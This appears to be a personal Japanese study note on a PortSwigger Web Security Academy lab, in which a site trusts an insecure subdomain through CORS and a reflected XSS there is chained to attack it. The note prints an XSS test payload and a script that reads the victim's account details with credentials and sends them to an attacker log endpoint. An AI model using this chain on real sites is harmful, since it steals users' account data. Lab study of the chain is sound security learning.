
Date: 2025-09-19
Tags: 
Links: [[WSA]], [[CORS]]

***

脆弱なサブドメインなどを信頼している（Access-Control-Allow-Origin)。
サブドメインの脆弱性を利用

***
# Lab

1. 被害サイトはサブドメインのオリジンを信頼する設定。
2. サブドメインでXSS脆弱性が見つかる。URLに含めたjavascriptがそのまま実行される。
```http
GET /?productId=2<script>alert(1)</script>&storeId=2 
```

3. スクリプトを被害者に送る
```javascript
<script> 
	var req = new XMLHttpRequest(); 
	req.onload = reqListener;
	req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
	req.withCredentials = true;
	req.send();
	  
	 function reqListener() { 
		 location='/log?key='+this.responseText;
	 }; 
 </script>
```
これをURLエンコードして
```javascript
<script>
 document.location='http://---/?productId=2<script>alert(1)</script>&storeId=2
</script>
```
に差し込む。


***
# References

https://portswigger.net/web-security/learning-paths/cors/cors-vulnerabilities-arising-from-cors-configuration-issues/cors/lab-breaking-https-attack#